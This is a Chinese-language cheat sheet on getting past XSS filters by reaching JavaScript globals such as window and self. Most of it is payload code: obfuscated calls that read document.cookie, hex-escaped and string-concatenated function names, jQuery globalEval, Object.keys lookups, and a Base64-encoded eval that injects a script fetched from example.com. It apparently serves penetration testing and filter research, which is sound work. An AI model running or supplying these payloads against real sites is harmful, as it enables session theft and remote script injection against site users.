# 利用全局变量绕过xss防护

### 1. 全局变量的概念

本来可获取cookie的payload

* document.cookie
* cocument . cookie
* doument/_foo_/./_bar_/cookie

但是过滤器使用的正则表达式，形如`/document[^.].[^.]cookie`。可以使用下面的payload

* window\['document'\]\['cookie'\]
* window\['alert'\]\(window\['document'\]\['cookie'\]\)
* self\["document"/_bar_/\]\["cookie"\]
* self\[/_foo_/"alert"\]\(self\["document"/_bar_/\]\["cookie"\]\)
* \(/ _this is a comment_ /self/ _foo_ /\)\[/_bar_/"alert"/\*\*/\]\("yo"\)

Window.self的只读属性可以将window对象本身以WindowProxy返回，它能够以`window.self`或直接是`self`的形式来使用。这种单独标注的使用形式有点就在于它跟非window对象的使用场景很相似，使用`self`，我们就可以尝试找到非window对象的使用场景，因为`self`会被解析为`window.self`。比如说Web Workers，在worker场景下，`self`将会被解析为`WorkerGlobalScope.self`。

我们可以利用以下对象来调用任何一种JavaScript函数：

window、 self 、\_self、 this 、top、 parent、 frames

### 2. 字符串连接绕过

```text
self['ale'+'rt']('a')
self['ale'+'rt'](self)
```

### 3. 转为16进制

```text
self['\x61\x6c'+'\x65\x72\x74']('a')
self["\x61\x6c\x65\x72\x74"](self["\x64\x6f\x63\x75\x6d\x65\x6e\x74"]["\x63\x6f\x6f\x6b\x69\x65"])
```

### 4. Base64编码字符串

```text
self["\x65\x76\x61\x6c"](
self["\x61\x74\x6f\x62"](
"dmFyIGhlYWQgPSBkb2N1bWVudC5nZXRFbGVtZW50\
c0J5VGFnTmFtZSgnaGVhZCcpLml0ZW0oMCk7dmFyI\
HNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbn\
QoJ3NjcmlwdCcpO3NjcmlwdC5zZXRBdHRyaWJ1dGU\
oJ3R5cGUnLCAndGV4dC9qYXZhc2NyaXB0Jyk7c2Ny\
aXB0LnNldEF0dHJpYnV0ZSgnc3JjJywgJ2h0dHA6L\
y9leGFtcGxlLmNvbS9teS5qcycpO2hlYWQuYXBwZW\
5kQ2hpbGQoc2NyaXB0KTs="))

等于

eval("var head = document.getElementsByTagName('head').item(0);\
    var script = document.createElement('script');\
    script.setAttribute('type', 'text/javascript');\
    script.setAttribute('src', 'http://example.com/my.js');\
    head.appendChild(script);"
)
```

### 5. 利用jQuery

```text
self["&"]["globalEval"]("alert(1)")
self["\x24"]
self["\x24"]["\x67\x6c\x6f\x62\x61\x6c\x45\x76\x61\x6c"]("\x61\x6c\x65\x72\x74\x28\x31\x29")
```

### 6. 迭代和Object.keys

Object.keys\(\)方法可以返回一个给定对象的names属性列表：

```text
c=0; for(i in self) { if(i == "alert") { console.log(c); } c++; }
> Object.keys(self)[148]
< "alert"
> self[Object.keys(self)[148]]("foo") // alert("foo")
```

```bash
# 枚举函数
f=""
for(i in self) {
    if(typeof self[i] === "function") {
        f += i+", "
    } 
};
console.log(f)

# 封装
a = function() {
    c=0; // index counter
    for(i in self) {
        if(/^a[rel]+t$/.test(i)) {
            return c;
        }
        c++;
    }
}

# in one line
a=()=>{c=0;for(i in self){if(/^a[rel]+t$/.test(i)){return c}c++}}

# then you can use a() with Object.keys
# alert("foo")

self[Object.keys(self)[a()]]("foo")
```

### 参考

* [https://www.anquanke.com/post/id/180187](https://www.anquanke.com/post/id/180187)

